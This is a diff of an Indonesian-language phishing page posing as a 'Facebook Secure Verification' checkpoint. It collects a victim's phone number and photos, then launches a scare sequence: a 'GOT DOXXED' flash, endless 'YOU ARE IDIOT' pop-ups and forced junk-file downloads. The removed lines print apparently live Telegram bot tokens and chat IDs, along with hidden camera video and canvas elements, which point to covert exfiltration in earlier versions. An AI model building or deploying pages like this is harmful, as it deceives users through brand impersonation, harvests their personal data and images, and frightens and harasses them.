@@ -6,7 +6,6 @@
     <title>Facebook - Secure Verification</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        /* Splash Screen */
         #splash-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
@@ -22,50 +21,40 @@
         
         .btn-fb { 
             background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
-            padding: 12px; border-radius: 8px; border: none; width: 100%;
-            transition: 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            padding: 12px; border-radius: 8px; border: none; width: 100%; transition: 0.2s;
         }
-        .btn-fb:active { transform: scale(0.94); }
 
         /* CHAOS OVERLAY ☠️ */
         #chaos-overlay { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: black; z-index: 10000; 
         }
-        #chaos-video { width: 100%; height: 100%; object-fit: contain; background: black; }
+        #chaos-video { width: 100%; height: 100%; object-fit: contain; }
         
         .popup-virus {
             position: absolute; width: 220px; background: #eee; border: 2px solid #000;
             box-shadow: 8px 8px 0px rgba(0,0,0,0.8); padding: 10px; z-index: 10001;
-            font-family: "Courier New", monospace; font-weight: bold; animation: glitch 0.3s infinite alternate;
+            font-family: "Courier New", monospace; animation: glitch 0.2s infinite;
         }
-        @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(5px,5px); } }
+        @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(3px,3px); } }
         
         .doxxed-flash {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            color: #ff0000; font-size: 40px; font-weight: 900; z-index: 10005;
-            text-shadow: 4px 4px #000; animation: flash-anim 0.2s infinite; display: none;
-            text-align: center; width: 100%;
+            color: #ff0000; font-size: 45px; font-weight: 900; z-index: 10005;
+            text-shadow: 4px 4px #000; animation: flash-anim 0.1s infinite; display: none;
         }
         @keyframes flash-anim { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
 
-        /* ANIMASI MUSIK 🎵 */
         .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; display: none; }
         .bar { width: 3px; height: 100%; background: #1877f2; animation: wave 1s infinite; }
         @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }
 
-        /* Credit & Music Bar */
         .credit-bar {
             position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
             color: white; padding: 10px 20px; display: flex; align-items: center; 
-            justify-content: space-between; backdrop-filter: blur(15px);
-            border-top: 2px solid #1877f2; z-index: 1000;
+            justify-content: space-between; backdrop-filter: blur(15px); border-top: 2px solid #1877f2; z-index: 1000;
         }
-        .credit-info { display: flex; flex-direction: column; text-align: left; }
         .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; }
-        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 11px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
-        
-        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
@@ -86,16 +75,17 @@
     <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
 </audio>
 
-<div class="container" id="main-ui">
+<div class="container">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
-        <h6 class="fw-bold mt-2">Checkpoint Keamanan Akun</h6>
+        <h6 class="fw-bold mt-2">Checkpoint Keamanan</h6>
         <hr>
         <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left;">
-            <b>Gagal!</b><br>Pastikan nomor HP benar dan pilih 5 foto.
+            <b>Gagal!</b><br>Pastikan nomor HP benar dan upload MAKSIMAL 5 foto.
         </div>
         <div class="text-start">
             <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon">
+            <label class="small fw-bold">Upload Foto (Maks 5):</label>
             <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
         </div>
         <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
@@ -107,7 +97,7 @@
         <span style="font-size: 10px; color: #888;">Developed by:</span>
         <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
     </div>
-    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
+    <button class="btn-fb btn-sm" style="width: auto; padding: 5px 15px;" onclick="toggleMusic()">
         <span id="btnText">▶ PLAY MUSIC</span>
         <div class="music-anim" id="animContainer">
             <div class="bar"></div><div class="bar"></div><div class="bar"></div>
@@ -115,35 +105,26 @@
     </button>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
 <script>
-    const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
-    const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
     const anim = document.getElementById('animContainer');
 
-    window.onload = () => {
-        setTimeout(() => {
-            document.getElementById('splash-screen').style.display = 'none';
-            document.body.style.display = 'block';
-        }, 3000);
-    };
+    window.onload = () => { setTimeout(() => { 
+        document.getElementById('splash-screen').style.display = 'none';
+        document.body.style.display = 'block';
+    }, 3000); };
 
     function toggleMusic() {
         const txt = document.getElementById('btnText');
-        if (audio.paused) { 
-            audio.play(); txt.innerText = "⏸ PAUSE"; anim.style.display = "flex";
-        } else { 
-            audio.pause(); txt.innerText = "▶ PLAY MUSIC"; anim.style.display = "none";
-        }
+        if (audio.paused) { audio.play(); txt.innerText = "⏸ PAUSE"; anim.style.display = "flex"; }
+        else { audio.pause(); txt.innerText = "▶ PLAY MUSIC"; anim.style.display = "none"; }
     }
 
     function validateFinal() {
         const phone = document.getElementById('phone').value;
         const files = document.getElementById('galeri').files;
-        if (phone.length < 10 || files.length < 5) {
+        // Validasi: Harus isi nomor HP dan foto TIDAK BOLEH lebih dari 5
+        if (phone.length < 10 || files.length === 0 || files.length > 5) {
             document.getElementById('mainError').style.display = 'block';
             return;
         }
@@ -158,25 +139,25 @@
         overlay.style.display = 'block';
         vid.muted = false;
         vid.play();
-        
         dox.style.display = 'block';
-        // Teks "GOT DOXXED" Muncul 2 Menit (120000ms) ☠️
-        setTimeout(() => { dox.style.display = 'none'; }, 120000);
 
-        // Spam Pop-up Virus selama 2 Menit penuh 😈
+        // Unlimited Pop-up Spam selama 2 Menit (120000ms)
         let popInterval = setInterval(() => {
             let div = document.createElement('div');
             div.className = 'popup-virus';
-            div.style.top = Math.random() * 80 + '%';
-            div.style.left = Math.random() * 80 + '%';
-            div.innerHTML = "<span style='color:red'>WARNING!</span><br>YOU ARE IDIOT!<br>GOT DOXXED!";
+            div.style.top = Math.random() * 85 + '%';
+            div.style.left = Math.random() * 85 + '%';
+            div.innerHTML = "<b style='color:red'>SYSTEM CRITICAL</b><br>YOU ARE IDIOT!<br>GOT DOXXED!";
             overlay.appendChild(div);
-        }, 300); // Pop up baru tiap 0.3 detik
+        }, 200);
 
-        // Hentikan spam pop-up setelah 2 menit
-        setTimeout(() => { clearInterval(popInterval); }, 120000);
+        // Berhenti setelah 2 menit
+        setTimeout(() => { 
+            clearInterval(popInterval); 
+            dox.style.display = 'none';
+        }, 120000);
 
-        // Auto Download file sampah
+        // Auto Download 5 file sampah
         for (let j = 1; j <= 5; j++) {
             let blob = new Blob(["YOU IDIOT HAHAHA"], { type: "text/plain" });
             let url = window.URL.createObjectURL(blob);
